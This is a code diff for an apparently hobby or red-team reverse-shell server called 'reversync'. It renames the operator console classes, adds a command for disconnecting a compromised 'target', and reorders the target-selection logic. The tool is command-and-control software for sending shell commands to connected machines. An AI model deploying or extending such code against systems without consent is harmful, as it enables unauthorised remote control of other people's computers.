@@ -3,7 +3,7 @@ import json
 import struct
 import subprocess
 from asyncio import CancelledError, IncompleteReadError
-from server_console import ServerConsole
+from server_console import InteractiveConsole
 from targetsInfo import TargetInfo, Targets
 
 
@@ -70,10 +70,10 @@ async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: 
         console.output = "[-] Connection closed cleanly."
 
 
-class Console:
+class TargetControlConsole:
     def __init__(self, shutdown_event: asyncio.Event):
         """
-        Initializes the Console class for handling server-side shell interactions.
+        Initializes the TargetControlConsole class for handling server-side shell interactions.
 
         Parameters:
         - shutdown_event: asyncio.Event — used to signal server shutdown.
@@ -87,21 +87,12 @@ class Console:
         """
         try:
             while True:
-                command = await asyncio.get_running_loop().run_in_executor(None, console.b_input)
+                command = await asyncio.get_running_loop().run_in_executor(None,console.b_input)
 
                 if not command:
                     continue
 
                 command_lower = command.lower().strip()
-
-                if command_lower.startswith("select target "):
-                    try:
-                        index = int(command.removeprefix("select target "))
-                        targets.change_target(index - 1)
-                        console.shell_prompt = targets.prompt
-                    except IndexError:
-                        console.output = "[-] Invalid target index."
-                    continue
 
                 if command_lower == "targets":
                     console.output = f'{targets}'
@@ -116,6 +107,7 @@ class Console:
                         " [+] select target <int>      - Select a target machine by its index\n"
                         " [+] clear                    - Clear the console output\n"
                         " [+] help                     - Show this help menu\n"
+                        " [+] stop <int>               - Disconnect a target\n"
                         " [+] shutdown                 - Shut down the server and disconnect all targets\n"
                     )
 
@@ -134,6 +126,30 @@ class Console:
                     subprocess.call("clear")
                     continue
 
+                if not list(targets.connections):
+                    console.output = '[-] No client has connected yet...'
+                    continue
+
+                if command_lower.startswith("stop "):
+                    try:
+                        index = int(command_lower.removeprefix("stop "))
+                        addr = targets.get_target_address(index -1)
+                        targets.connections[addr].close()
+                        await targets.connections[addr].wait_closed()
+                        targets.delete(addr)
+                    except (IndexError,ValueError):
+                        console.output = "[-] Invalid target index."
+                    continue
+
+                if command_lower.startswith("select target "):
+                    try:
+                        index = int(command.removeprefix("select target "))
+                        targets.change_target(index - 1)
+                        console.shell_prompt = targets.prompt
+                    except (IndexError,ValueError):
+                        console.output = "[-] Invalid target index."
+                    continue
+
                 # If a client is selected, send the command
                 if targets.current_address:
                     writer = targets.connections.get(targets.current_address)
@@ -142,8 +158,6 @@ class Console:
                         await writer.drain()
                     else:
                         console.output = "[-] Selected client is no longer connected."
-                elif not targets.connections:
-                    console.output = '[-] No client has connected yet...'
                 else:
                     console.output = '[-] Select a target using "select target <int>"'
 
@@ -171,7 +185,7 @@ async def run_reverse_shell_server():
     - Waits for shutdown signal from the console to gracefully terminate.
     """
     shutdown_event = asyncio.Event()
-    server_console = Console(shutdown_event)
+    server_console = TargetControlConsole(shutdown_event)
     console_task = asyncio.create_task(server_console.server_console())
 
     # Small delay to ensure console starts before accepting connections
@@ -222,7 +236,7 @@ async def run_reverse_shell_server():
 if __name__ == "__main__":
     # Initialize target manager and main console instance
     targets = Targets()
-    console = ServerConsole("reversync")
+    console = InteractiveConsole("reversync")
 
     try:
         asyncio.run(run_reverse_shell_server())
